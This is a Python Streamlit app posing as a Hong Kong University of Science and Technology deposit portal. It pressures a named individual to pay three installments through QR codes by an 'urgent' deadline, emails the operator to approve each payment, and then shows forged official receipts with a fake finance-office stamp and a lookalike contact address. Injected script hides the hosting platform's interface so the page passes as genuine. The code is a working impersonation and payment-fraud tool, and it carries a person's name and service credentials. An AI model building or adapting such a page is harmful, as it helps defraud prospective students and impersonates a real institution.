import streamlit as st
import base64
import os
import time
from datetime import datetime
import requests

# --- 1. 頁面配置 ---
st.set_page_config(page_title="HKUST Deposit Portal", page_icon="✅", layout="wide")

def get_base64_file(file):
    if os.path.exists(file):
        with open(file, 'rb') as f: return base64.b64encode(f.read()).decode()
    return None

logo_base64 = get_base64_file("hkust.png")
STAMP_DATE = datetime.now().strftime('%d %B %Y').upper()

# --- 2. JavaScript + CSS 雙重淨化 (絕殺方案) ---
# 這段代碼會周期性清理 DOM 樹，確保那些圖標一冒頭就被刪掉
st.markdown("""
<script>
    const killElements = () => {
        const selectors = [
            'header', 'footer', '.stDeployButton', '.stAppDeployButton', 
            '[data-testid="stStatusWidget"]', '[data-testid="stHeader"]', 
            '[data-testid="stToolbar"]', '[data-testid="stDecoration"]',
            'iframe[title="Manage app"]', '#MainMenu'
        ];
        selectors.forEach(selector => {
            const el = document.querySelector(selector);
            if (el) el.remove();
        });
    };
    // 每 500 毫秒執行一次清理
    setInterval(killElements, 500);
</script>

<style>
    /* CSS 同步輔助隱藏 */
    #MainMenu, header, footer, .stDeployButton, .stAppDeployButton {display: none !important; visibility: hidden !important;}
    [data-testid="stHeader"], [data-testid="stStatusWidget"] {display: none !important;}
    
    /* 強制 AppView 容器不產生滾動條，蓋掉底部殘影 */
    [data-testid="stAppViewContainer"] { overflow: hidden !important; background-color: #FFFFFF !important; }
    .block-container { padding-top: 0rem !important; }

    /* 導航欄：提至最高層級 */
    .nav-bar {
        background-color: #003366; padding: 12px 60px; display: flex; align-items: center; color: white;
        border-bottom: 4px solid #A6937C; margin: -50px -100px 30px -100px;
        position: relative; z-index: 999999 !important;
    }
    .nav-logo { height: 85px; width: auto; mix-blend-mode: screen; margin-right: 25px; }
    .system-title { border-left: 2px solid #fff; padding-left: 20px; font-size: 20px; font-weight: 500; }

    /* 收據與卡片樣式 */
    .payment-card { background: white; padding: 35px; border-radius: 12px; border: 1px solid #eee; color: #000 !important; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
    .deadline-box { color: #d32f2f !important; font-weight: bold; font-size: 16px; background-color: #f8d7da !important; padding: 18px; border-radius: 6px; margin: 15px 0; border: 1px solid #f5c6cb; }
    .receipt-box { background: white; border: 1px solid #003366; padding: 40px; max-width: 800px; margin: auto; position: relative; color: #333 !important; }
    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; }

    /* 藍色印章 */
    .official-stamp {
        position: absolute; bottom: 40px; right: 50px; width: 145px; height: 145px;
        border: 3px double #1a478a; border-radius: 50%; color: #1a478a;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        text-align: center; font-family: 'Courier New', monospace; font-weight: bold;
        transform: rotate(-12deg); opacity: 0.8; pointer-events: none;
    }
</style>
""", unsafe_allow_html=True)

# --- 3. 狀態與 EmailJS (保持不變) ---
STATUS_FILE = "payment_status.txt"
def set_status(s):
    with open(STATUS_FILE, "w") as f: f.write(s)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

q = st.query_params
if q.get("action") in ["approve1", "approve2", "approve3"]:
    set_status(q.get("action").replace("approve", "approved"))
    st.success("Verified!")
    st.stop()

PAYER = "XINGSHENG WANG"
HKD_TOTAL, USD_TOTAL = "51,643", "6,593.21"
USER_ID, SERVICE_ID, TEMPLATE_ID = "2Mp8IGmfTvvDLueQN", "service_hjp7b95", "template_6sdyg2j"
MY_URL = "https://hkust-pre-of-tpg.streamlit.app/"

if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. 渲染 UI ---
logo_html = f'<img src="data:image/png;base64,{logo_base64}" class="nav-logo">' if logo_base64 else ""
st.markdown(f'<div class="nav-bar">{logo_html}<div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Secure Gateway</span></div></div>', unsafe_allow_html=True)

# 邏輯流程 (分三次支付)
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div style="border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto;"></div><h2 style="color:#003366; margin-top:20px;">Verifying Installment {stage}...</h2></div>""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}": st.session_state.step = f"receipt{stage}"
    st.rerun()

elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3>Payment Plan Confirmation</h3><p><b>Payer:</b> {PAYER}</p><p>Deposit total: <b>HK$ {HKD_TOTAL} (≈ USD {USD_TOTAL})</b></p>
        <div class="deadline-box">⚠️ URGENT: Complete payment by 4:00 PM, April 24th to secure your TLE MSc program place.</div>
        <p style="text-align:center; font-weight:bold; color:#d32f2f;">Action: 1st Installment - USD 1,200.00</p></div>""", unsafe_allow_html=True)
        st.image("qr1.png", width=400)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# 收據頁面 (收據內包含聯繫方式與藍色印章)
elif st.session_state.step in ["receipt1", "receipt2", "receipt3"]:
    sn = st.session_state.step[-1]
    amts = {"1": "1,200.00", "2": "3,000.00", "3": "2,393.21"}
    st.markdown(f"""
    <div class="receipt-box">
        <div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
            <h2 style="margin:0; color:#003366;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
            <p style="font-size:11px; margin-top:5px; color:#666;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
        </div>
        <h3 style="text-align:center; text-decoration: underline; color:#333;">OFFICIAL ELECTRONIC RECEIPT</h3>
        <div class="info-row"><span><b>Receipt No:</b></span><span>UST-{int(time.time())}</span></div>
        <div class="info-row"><span><b>Received From:</b></span><span>{PAYER}</span></div>
        <div class="info-row" style="border-top:2px solid #003366; margin-top:10px;"><span><b>AMOUNT RECEIVED:</b></span><span style="font-size:18px; color:#003366;"><b>USD {amts[sn]}</b></span></div>
        <div style="margin-top:40px; border-top: 1px dashed #eee; padding-top:15px;">
            <p style="font-size:12px; color:#666; margin-bottom:5px;"><b>Note:</b> This document is electronically generated. No signature is required.</p>
            <p style="font-size:13px; color:#333;">For inquiries, please contact: <a href="mailto:uagdmit@hkust-tle.hk" style="color:#003366; text-decoration:none;"><b>uagdmit@hkust-tle.hk</b></a></p>
        </div>
        <div class="official-stamp">
            <div style="font-size: 11px;">HKUST</div><div class="stamp-paid">PAID</div><div style="font-size: 13px;">{STAMP_DATE}</div><div style="font-size: 8px;">FINANCE OFFICE</div>
        </div>
    </div>
    """, unsafe_allow_html=True)
    st.write("## ")
    if sn == "1":
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"): st.session_state.step = "pay2"; st.rerun()
    elif sn == "2":
        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"): st.session_state.step = "pay3"; st.rerun()
    else:
        st.balloons(); st.success("All installments verified. Seat secured.")

# 階段 2 & 3 (邏輯同上)
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f'<div class="payment-card"><h3>2nd Installment Payment</h3><p><b>Payer:</b> {PAYER}</p><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 3,000.00</p></div>', unsafe_allow_html=True)
        st.image("qr2.png", width=400)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f'<div class="payment-card"><h3>Final Installment Payment</h3><p><b>Payer:</b> {PAYER}</p><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 2,393.21</p></div>', unsafe_allow_html=True)
        st.image("qr3.png", width=400)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
